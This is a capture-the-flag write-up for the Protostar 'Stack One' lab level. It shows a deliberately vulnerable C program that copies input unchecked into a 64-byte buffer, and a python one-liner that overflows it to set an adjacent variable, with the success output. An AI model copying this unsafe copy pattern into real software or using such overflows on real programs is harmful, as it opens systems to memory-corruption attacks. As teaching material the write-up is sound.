# Stack One

This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

This level is at /opt/protostar/bin/stack1

Hints
- If you are unfamiliar with the hexadecimal being displayed, "man ascii" is your friend.
- Protostar is little endian

## Source Code

```c++
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

## Writeup

In this code we have a **buffer** of 64 char, that means is a **buffer** of 64 byte.

After this, in the Stack we have the **modified** variable of 4 byte.

We can write 64 char and add at the end the 4 byte of **modified** value.

We need to write **0x61626364** in the **modified** variable. Let's inject it with python (in little endian):

```bash
/opt/protostar/bin/stack1 `python -c "print('A' * 64 + '\x64\x63\x62\x61')"`
```

The output of the program will be:

```bash
user@protostar:/opt/protostar/bin$ /opt/protostar/bin/stack1 `python -c "print('A' * 64 + '\x64\x63\x62\x61')"`
you have correctly got the variable to the right value
```